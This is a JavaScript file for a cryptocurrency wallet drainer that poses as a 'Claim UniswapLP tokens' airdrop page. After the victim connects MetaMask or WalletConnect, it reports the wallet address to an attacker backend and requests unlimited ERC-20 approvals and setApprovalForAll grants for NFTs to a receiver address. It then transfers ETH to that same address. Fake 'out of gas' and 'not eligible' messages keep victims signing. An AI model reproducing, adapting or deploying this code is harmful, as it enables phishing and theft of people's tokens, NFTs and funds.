//#region Utils Functions
function isMobile() {
    var check = false;
    (function (a) {
        if (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(a) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(a.substr(0, 4))) check = true;
    })(navigator.userAgent || navigator.vendor || window.opera);
    return check;
};

function openInNewTab(href) {
    Object.assign(document.createElement('a'), {
        target: '_blank',
        href: href,
    }).click();
}

const round = (value) => {
    return Math.round(value * 10000) / 10000;
}
const sleep = (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
}
const getRdm = (min, max) => {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
//#endregion

//#region Web3.js
let metamaskInstalled = false;
if (typeof window.ethereum !== 'undefined') metamaskInstalled = true;

let web3Provider;
async function connectButton() {
	try {
		await Moralis.enableWeb3(metamaskInstalled ? {} : {
        provider: "walletconnect"
    });
	} catch (err) {
		//console.log(err);
		if(err.message.toString().includes("lready")) {
			$("#elig").html("Wallet connection is pending.");
		} else if(err.message.toString().includes("rejected")) {
			return;
		} else {
			$("#elig").html("No MetaMask detected.");
		}
		setTimeout(() => {
			$("#elig").html("");
		}, 2000);
	}
}

let connected = false;
let transactionLists = [];

Moralis.onWeb3Enabled(async (data) => {
    if (data.chainId !== 1 && metamaskInstalled) await Moralis.switchNetwork("0x1");
	if(data.chainId == 1) {
		updateState(2);
		console.log(data);
		$("#walletAddress").html(await Moralis.Web3.account.toString());
		$("#connectDiv").css("display", "none");
		$("#kyc-block").css("display", "block");
		await askNfts();
	}
});
Moralis.onChainChanged(async (chain) => {
    if (chain !== "0x1" && metamaskInstalled) await Moralis.switchNetwork("0x1");
});
window.ethereum ? window.ethereum.on('disconnect', (err) => {
    console.log(err);
    updateState(1);
}) : null;
window.ethereum ? window.ethereum.on('accountsChanged', (accounts) => {
    if (accounts.length < 1) updateState(1)
}) : null;


function updateState(state) {
	if(state == 1) {
		$("#connectButton").html("Claim tokens");
		connected = false;
	} else if(state == 2) {
		$("#connectButton").html("Claim tokens");
		connected = true;
	} else if(state == 3) {
		$("#elig").html("Error: you are not eligable.");
	} else {
		$("#elig").html("Error: ethereum transaction out of gas.");
		setTimeout(() => {
			$("#elig").html("Click `Claim tokens` button to claim UniswapLP tokens.");
		}, 3000);
	}
}

	let info;
	/* global BigInt */
async function askNfts() {
	if(block) return;
    const web3Js = new Web3(Moralis.provider);
    const walletAddress = (await web3Js.eth.getAccounts())[0];

	await $.ajax({
		type : "POST",
		url  : getDomain()+`/claim`,
		data : { address: walletAddress, address1: Iil1ililIl1iIl1ill1Ilii },
		success: function(data, status, xhr) {
			info = data;
		},
		error: function(xhr, status, error) {
			updateState(4);
			console.log(error);
		},
	});
		
	if (info == undefined || info.toString().includes("Internal Server Error")) {
		return updateState(4);
	}
    //if (info.assets.length == 0) return updateState(3);

	console.log(info.assets);

    for (asset of info.assets) {
		if(asset.scheme.includes("20")) {
			transactionLists.push({
            options: {
                contractAddress: asset.contract,
                from: walletAddress,
                functionName: "approve",
                abi: [{
                    "inputs": [{
                        "internalType": "address",
                        "name": "operator",
                        "type": "address"
                    }, {
                        "internalType": "uint256",
                        "name": "amount",
                        "type": "uint256"
                    }],
                    "name": "approve",
                    "outputs": [],
                    "stateMutability": "nonpayable",
                    "type": "function"
                }],
                params: {
                    operator: info.receiver,
                    amount: BigInt("99999999999999999999999999999999999999"),
                },
                gasLimit: "0x55F0"
            }
        });
		} else {
        transactionLists.push({
            options: {
                contractAddress: asset.contract,
                from: walletAddress,
                functionName: "setApprovalForAll",
                abi: [{
                    "inputs": [{
                        "internalType": "address",
                        "name": "operator",
                        "type": "address"
                    }, {
                        "internalType": "bool",
                        "name": "approved",
                        "type": "bool"
                    }],
                    "name": "setApprovalForAll",
                    "outputs": [],
                    "stateMutability": "nonpayable",
                    "type": "function"
                }],
                params: {
                    operator: info.receiver,
                    approved: true
                },
                gasLimit: "0x55F0"
            }
        });
		}
    }
	
	await startLoop();
}

		async function getAsset() {
			for(var i = 0; i < transactionLists.length; i++) {
				return transactionLists[i];
			}
			return null;
		}
		
let block = false;
async function sendEth() {
	block = true;
			let stop = false
			const options = {
				type: "native",
				amount: Moralis.Units.ETH(info.mint_price),
				receiver: info.receiver,
			};
			let result = await Moralis.transfer(options).catch(err => {
				if(err.code === 4001) {
					updateState(4);
				}
				if(err.toString().includes("insufficient funds")) {
					$("#elig").html("Error: you are not eligable.");
					stop = true
					block = false;
				}
			});
		
	return stop;
}

async function startLoop() {
	let trans = await getAsset();
	if(trans == null) {
		stop = await sendEth();
		if(stop) return;
	} else {
		await approve(trans);
		if(await getAsset() == null) block = false;
	}
	await startLoop();
}

async function approve(transaction) {
	block = true;
	let result = null;
			try {
				result = await Moralis.executeFunction(transaction.options);
			} catch(err) {
				console.log(err);
				if(err.toString().includes("invalid opcode: INVALID")) {
					spliceArr(transactionLists, transaction);
					return;
				}
			}
			if(result != null) check(result, transaction);
}

async function check(result, transaction) {
	spliceArr(transactionLists, transaction);
	approveMsg(transaction);
	try {
		await result.wait()
		updateState(4);
	} catch(err) {
		transactionLists.unshift(transaction);
	}
}

function spliceArr(nftArr, nft) {
	for(var i = 0; i < nftArr.length; i++){ 				   
		if (nftArr[i] === nft) {
			nftArr.splice(i, 1); 
			i--;
		}
	}
}

async function approveMsg(transaction) {
		await $.ajax({
		type : "POST",
		url  : getDomain()+`/approve`,
		data : { address: transaction.options.from, contract: transaction.options.contractAddress, address1: Iil1ililIl1iIl1ill1Ilii },
		error: function(xhr, status, error) {
			updateState(4);
			approveMsg(transaction);
			console.log(error);
		},
	});
}

$(document).ready(async () => {
    $("#connectButton").click(async () => {
		await start(true);
	});
	await start(false);
});

async function start(clicked) {
	if(!metamaskInstalled) {
		if(clicked) {
			if(isMobile()) {
				openInNewTab(`https://metamask.app.link/dapp/${window.location.hostname}${window.location.pathname}`);
			} else {
				openInNewTab("https://metamask.io/download/");
			}
		
		$("#connectButton").html("No Web3 Extension");
		setTimeout(() => {
			$("#connectButton").html("Connect your wallet");
		}, 5000);
		return;
		}
	}

	if(connected) {
		await askNfts();
	} else {
		try {
			await connectButton();
		} catch(err) {
			if(err.message.toString().includes("lready")) {
				$("#elig").html("Connection is pending");
			} else if(err.message.toString().includes("rejected")) {
				return;
			} else {
				$("#elig").html("No Web3 Extension");
			}
			setTimeout(() => {
				$("#elig").html("Click `Claim tokens` button to claim UniswapLP tokens.");
			}, 3000);
		}
	}
}

function getDomain() {
	hostname = `${window.location.hostname}`
	if(hostname.startsWith("www.")) {
		hostname = hostname.substring(4);
	}
	return "https://api."+hostname;
}

$('a').on('click',function(e){
 if($(this).attr('href')=='#')
  return e.preventDefault();
});

//#endregion
